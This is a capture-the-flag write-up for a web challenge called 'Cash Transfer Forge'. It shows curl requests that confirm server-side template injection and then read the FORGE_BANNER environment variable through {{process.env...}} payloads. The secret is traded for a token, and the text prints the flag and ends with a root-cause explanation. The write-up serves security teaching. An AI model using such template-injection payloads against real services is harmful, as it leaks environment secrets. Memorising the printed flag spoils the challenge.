# Cash Transfer Forge — Writeup

**Challenge**: Cash Transfer Forge  
**Category**: Web / SSTI (Server-Side Template Injection)  
**Flag**: `SDG{b81fcc0625cc8855bf3ba5b2cfb1f58a}`

---

## Overview

The EmergencyCash Certificate Generator renders recipient names through a micro-template engine that was prototyped during a hackathon. A debug helper was left on the rendering context, and `process.env` was exposed for variable lookup. This allows Server-Side Template Injection (SSTI) to access environment variables — specifically `FORGE_BANNER`, which can be traded at `/forge` for the proof token.

```
API endpoint:
https://hackforachangeruntime.vercel.app/api/cash-transfer-forge?seed=bcac495e496fc913780b4995505cc8cf0b052a3cda69f2fcc26b2bd1c1b98882
```

---

## Step 1 — Service Info

```bash
curl "https://hackforachangeruntime.vercel.app/api/cash-transfer-forge?seed=bcac495e496fc913780b4995505cc8cf0b052a3cda69f2fcc26b2bd1c1b98882"
```

```json
{
  "ok": true,
  "system": "EmergencyCash Certificate Generator v0.9",
  "program": "SDG 1 — Rapid Disbursement Office",
  "endpoints": {
    "render": "POST ?action=render {\"name\": \"<recipient name>\"}",
    "forge":  "POST ?action=forge  {\"banner\": \"<extracted FORGE_BANNER>\"}"
  },
  "template": "The recipient line uses a built-in micro-template engine. {{ expr }} renders any expression in the engine's helper context (debug, process.env, etc.)."
}
```

Two endpoints:
- **`render`** — renders a recipient name through the template engine
- **`forge`** — trades the `FORGE_BANNER` value for a forge token (proof)

---

## Step 2 — Confirm SSTI

The hint suggests testing with `{{7*7}}`:

```bash
curl -X POST "...?action=render" \
  -H "Content-Type: application/json" \
  -d '{"name":"{{7*7}}"}'
```

```json
{
  "ok": true,
  "rendered": "══════════════════════════════════════════════════\n   SDG 1 — Rapid Disbursement Office — Cash Transfer Certificate\n══════════════════════════════════════════════════\n   Recipient: 49\n   ...
}
```

`{{7*7}}` evaluated to `49` — SSTI confirmed.

---

## Step 3 — Extract FORGE_BANNER

The service info revealed that `process.env` is accessible from template expressions. We access the `FORGE_BANNER` environment variable directly:

```bash
curl -X POST "...?action=render" \
  -H "Content-Type: application/json" \
  -d '{"name":"{{process.env.FORGE_BANNER}}"}'
```

```json
{
  "ok": true,
  "rendered": "...\n   Recipient: a811a24c7adb4faec80ca6a84f13981a\n   ..."
}
```

**FORGE_BANNER: `a811a24c7adb4faec80ca6a84f13981a`**

---

## Step 4 — Trade the Banner at /forge

```bash
curl -X POST "...?action=forge" \
  -H "Content-Type: application/json" \
  -d '{"banner":"a811a24c7adb4faec80ca6a84f13981a"}'
```

```json
{
  "ok": true,
  "forge_token": "a811a24c7adb4faec80ca6a84f13981a",
  "note": "Submit forge_token to claim-runtime-flag as proof."
}
```

---

## Step 5 — Claim the Flag

```
POST https://vgwukffsjudbybdeuodn.supabase.co/functions/v1/claim-runtime-flag
Authorization: Bearer <launch_token>
Content-Type: application/json

{ "token": "<launch_token>", "proof": "a811a24c7adb4faec80ca6a84f13981a", "slug": "cash-transfer-forge" }
```

```json
{
  "correct": true,
  "flag": "SDG{b81fcc0625cc8855bf3ba5b2cfb1f58a}"
}
```

---

## Summary

| Step | Action | Result |
|---|---|---|
| 1 | `GET ?action=info` | Identified SSTI surface: `{{ expr }}` with access to `process.env` |
| 2 | `POST {"name":"{{7*7}}"}` | Confirm SSTI — returns `49` |
| 3 | `POST {"name":"{{process.env.FORGE_BANNER}}"}` | Extract FORGE_BANNER: `a811a24c7adb4faec80ca6a84f13981a` |
| 4 | `POST {"banner":"..."}` | Trade at `/forge` → forge_token |
| 5 | Submit token to `claim-runtime-flag` | **`SDG{b81fcc0625cc8855bf3ba5b2cfb1f58a}`** |

### Root Cause

The template engine was left in debug mode with `process.env` exposed to the expression evaluator. No sandboxing or input sanitization was applied to the recipient name field, allowing arbitrary property access on the Node.js runtime environment. This is a classic SSTI vulnerability amplified by an overly permissive helper context.
